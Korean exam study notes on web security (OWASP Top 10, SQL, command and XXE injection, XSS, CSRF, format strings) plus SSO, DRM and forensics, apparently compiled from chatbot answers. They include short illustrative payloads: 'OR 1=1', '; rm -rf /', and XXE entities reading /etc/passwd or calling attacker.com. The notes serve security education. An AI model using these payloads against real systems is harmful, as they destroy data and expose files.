#### 📌 1. 웹 취약점 (OWASP Top 10)

|번호|항목|설명|
|---|---|---|
|1|취약한 접근 통제|권한 체크 미흡으로 다른 사용자 데이터 접근|
|2|암호화 실패|민감정보 암호화 미적용 또는 약한 암호화|
|3|인젝션|SQL, OS, LDAP 등 코드 삽입 공격|
|4|안전하지 않은 설계|보안 고려 없는 구조 설계|
|5|잘못된 보안 구성|서버/프레임워크 설정 오류|
|6|취약한 구성요소|오래된 라이브러리 사용|
|7|식별 및 인증 실패|로그인/세션 관리 취약|
|8|소프트웨어 및 데이터 무결성 오류|코드/데이터 위변조 검증 부족|
|9|보안 로깅 및 모니터링 실패|공격 탐지 불가|
|10|SSRF|서버가 내부 자원 요청하도록 유도|

#### 📌 3. SQL Injection (중요 ⭐)

## ✔ 개념

> 입력값을 조작하여 DB 쿼리를 변조하는 공격

---

## ✔ 발생 원인

- 입력값 검증 없음
    
- 문자열 기반 동적 쿼리
    

```sql
SELECT * FROM user WHERE id = 'admin' OR 1=1;
```

---

## ✔ 대응 방법

|방법|설명|
|---|---|
|입력값 검증|whitelist 방식|
|Prepared Statement|바인딩 변수 사용|
|ORM 사용|자동 방어|
|최소 권한|DB 권한 제한|
|에러 숨김|상세 메시지 제거|
|WAF|공격 필터링|

# 🔥 시험/면접용 핵심 요약

👉 한 줄씩 기억하면 좋음:

- **OWASP Top 10 = 웹 보안 핵심 위험 목록**
    
- **입력값 검증 = 모든 보안의 시작**
    
- **인증/인가 = 접근 통제 핵심**
    
- **암호화 = 데이터 보호 핵심**
    
- **SQL Injection = 가장 대표적인 공격**
    

---

시험/실무 둘 다 바로 쓸 수 있게 **정확하게 정리 + 오타 보정 + 핵심만 압축**해서 정리해줄게 👇

---

# 📌 코드 삽입 (Code Injection)

## ✔ 정의

- 사용자 입력을 통해 **애플리케이션 코드가 실행되는 공격**
    

## ✔ 보안 대책

- 입력값 검증 (Whitelist)
    
- 동적 코드 실행 금지 (`eval`, `exec` 등 제거)
    
- ORM / Prepared Statement 사용
    
- 권한 최소화
    

---

# 📌 운영체제 명령어 삽입 (Command Injection)

## ✔ 정의

- 입력값을 통해 **OS 명령어를 실행시키는 공격**
    

```bash
; rm -rf /
```

## ✔ 보안 대책

- OS 명령어 직접 실행 금지
    
- 입력값 필터링
    
- API 사용 (exec 대신 라이브러리)
    
- 쉘 사용 최소화
    

---

# 📌 위험한 파일 형식 업로드

(오타 수정: 웨험한 → 위험한)

## ✔ 정의

- 서버에 **악성 파일 업로드 후 실행**
    

## ✔ 보안 대책

- 파일 확장자 화이트리스트
    
- MIME 타입 검사
    
- 파일명 랜덤화
    
- 실행 경로와 저장 경로 분리
    
- 업로드 파일 실행 권한 제거
    
- 웹 루트 외부 저장
    

---

# 📌 XSS (Cross Site Scripting)

## ✔ 정의

- 악성 스크립트를 삽입하여 **사용자 브라우저에서 실행**
    

---

## ✔ 종류

|종류|설명|
|---|---|
|Stored XSS|서버에 저장 후 실행|
|Reflected XSS|요청에 포함되어 즉시 실행|
|DOM XSS|클라이언트 JS에서 발생|

---

## ✔ 공격 대상

- 사용자 세션 (쿠키 탈취)
    
- 인증 정보
    
- 웹페이지 변조
    

---

## ✔ 대책

- 출력 시 인코딩 (HTML escape)
    
- CSP(Content Security Policy) 적용
    
- 입력값 검증
    
- HttpOnly 쿠키 설정
    

---

# 📌 CSRF (Cross Site Request Forgery)

## ✔ 정의

- 사용자의 인증 정보를 이용해 **의도하지 않은 요청 수행**
    

---

## ✔ 특징

- 사용자가 로그인 상태일 때 발생
    
- 서버는 정상 요청으로 인식
    
- GET/POST 모두 가능
    

---

## ✔ 공격 방법

- 악성 사이트 접속 유도
    
- 자동 요청 발생 (form, img 등)
    

---

## ✔ 대책

- CSRF Token 사용 ⭐
    
- Referer / Origin 검증
    
- SameSite 쿠키 설정
    
- 중요 요청 재인증
    

---

# 📌 포맷 스트링 공격 (Format String)

## ✔ 정의

- 포맷 문자열(`%x`, `%s`)을 이용해 **메모리 접근**
    

---

## ✔ 메모리 열람

```c
printf(user_input);
```

👉 `%x` → 메모리 값 출력

---

## ✔ 메모리 변조

👉 `%n` 사용 → 메모리 값 변경

---

## ✔ 대책

- 포맷 문자열 고정 사용
    

```c
printf("%s", user_input);
```

---

# 📌 XXE Injection (XML External Entity)

## ✔ 정의

- XML 파서의 외부 엔티티 기능을 악용한 공격
    

---

## ✔ 주요 공격 유형

### 1️⃣ 파일 시스템 접근

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

👉 서버 내부 파일 조회

---

### 2️⃣ 외부 악성 파일 참조

```xml
<!ENTITY xxe SYSTEM "http://attacker.com/malicious">
```

👉 외부 서버와 통신

---

### 3️⃣ XSS 공격

- XML → HTML 변환 시 스크립트 삽입
    

---

### 4️⃣ DoS 공격

```xml
Billion Laughs Attack
```

👉 메모리 폭발

---

## ✔ 대책

- 외부 엔티티 비활성화 ⭐
    
- XML 파서 보안 설정
    
- JSON 사용 권장
    
- 입력값 검증
    

---

# 🔥 핵심 요약 (시험용)

👉 한 줄씩 기억:

- 코드 삽입 = 코드 실행
    
- 명령어 삽입 = OS 실행
    
- 파일 업로드 = 웹쉘 위험
    
- XSS = 사용자 브라우저 공격
    
- CSRF = 사용자 권한 도용
    
- 포맷 스트링 = 메모리 공격
    
- XXE = XML 기반 내부 접근
    

---

시험/실무 둘 다 바로 쓰기 좋게 **구조 + 표 중심 + 핵심 키워드**로 깔끔하게 정리해줄게 👇

---

# 📌 1. SSO (Single Sign-On)

## ✔ 개념

- **한 번의 인증으로 여러 시스템 접근 가능**
    
- 인증 서버가 중앙에서 로그인 처리
    

---

## ✔ 통합인증 개념도 (흐름)

```id="p3r8kp"
사용자 → 인증 서버(SSO) → 토큰 발급 → 서비스 서버 접근
```

---

## ✔ SSO 종류

|종류|설명|
|---|---|
|쿠키 기반|동일 도메인 내 인증 공유|
|토큰 기반|JWT, OAuth 활용|
|에이전트 기반|각 서버에 Agent 설치|
|게이트웨이 기반|Proxy/중앙 인증 서버|
|SAML 기반|XML 기반 인증 (기업용)|

---

# 📌 2. DRM (Digital Rights Management)

## ✔ 개요

- **디지털 콘텐츠의 불법 복제 및 유출 방지 기술**
    

---

## ✔ 요소 기술

|요소|설명|
|---|---|
|암호화|콘텐츠 보호|
|키 관리|복호화 키 관리|
|인증|사용자 확인|
|권한 관리|열람/복사 제한|
|로그|사용 이력 기록|

---

## ✔ 처리 방식

|방식|설명|
|---|---|
|패키징|콘텐츠 암호화|
|배포|사용자 전달|
|라이선스 발급|권한 부여|
|사용|인증 후 접근|

---

# 📌 3. 워터마킹 (Watermarking)

## ✔ 특징

- 콘텐츠에 **보이지 않는 식별 정보 삽입**
    
- 저작권 보호
    
- 추적 가능
    

---

## ✔ 공격 기법

|공격|설명|
|---|---|
|제거 공격|워터마크 삭제|
|변조 공격|일부 변경|
|재삽입 공격|새로운 워터마크 삽입|
|압축 공격|품질 손실 유도|

---

# 📌 4. 디지털 포렌식

## ✔ 정의

- **디지털 증거를 수집·분석하여 법적 증거로 활용하는 기술**
    

---

## ✔ 디지털 증거 특징 (휘발성)

- 쉽게 변경/삭제 가능
    
- 전원이 꺼지면 사라짐
    
- 복제 가능
    

---

## ✔ 디지털 포렌식 원칙

|원칙|설명|
|---|---|
|무결성|증거 변경 금지|
|정당성|적법한 절차|
|재현성|동일 결과 재현|
|연계보관성|Chain of Custody 유지|

---

## ✔ 휘발성 vs 비휘발성 데이터

|구분|예|
|---|---|
|휘발성|RAM, 프로세스, 네트워크 연결|
|비휘발성|HDD, 로그파일, DB|

---

## ✔ 휘발성 데이터 수집 우선순위 ⭐

1. CPU / Cache
    
2. RAM
    
3. 네트워크 상태
    
4. 프로세스 정보
    

---

## ✔ 비휘발성 데이터 수집 우선순위

1. 디스크 이미지
    
2. 로그 파일
    
3. 시스템 설정
    
4. 백업 데이터
    

---

## ✔ 로카르드 법칙 (Locard's Exchange Principle)

- **“접촉이 있으면 흔적이 남는다”**
    
- 공격자는 반드시 흔적을 남김
    

---

## ✔ 시스템 기본정보 획득

- OS 버전
    
- 사용자 계정
    
- 실행 프로세스
    
- 네트워크 상태
    
- 로그인 기록
    

---

## ✔ 1. 준비

- 법적 절차 확보
    

---

## ✔ 2. 획득

---

---

## ✔ 4. 분석

- 데이터 분석
    
- 행위 추적
    

---

## ✔ 5. 증거 분석서 작성

- 분석 결과 문서화
    
- 법적 증거화
    

---

## ✔ 6. 보관

- 증거 안전 보관
    
- 무결성 유지

# 🔥 시험 핵심 요약

👉 한 줄씩 암기:

- SSO = 한 번 로그인, 전체 접근
    
- DRM = 콘텐츠 보호
    
- 워터마킹 = 추적용 삽입 정보
    
- 포렌식 = 디지털 증거 분석
    
- 휘발성 데이터 = 먼저 수집
    
- 로카르드 법칙 = 흔적은 남는다

# 👍 추가 팁 (중요)

시험에서 자주 나오는 포인트:

- SSO → **SAML vs OAuth 차이**
    
- DRM → **암호화 + 키관리**
    
- 포렌식 → **휘발성 우선 수집**
    
- 절차 → **준비 → 획득 → 이송 → 분석 → 작성 → 보관 순서**
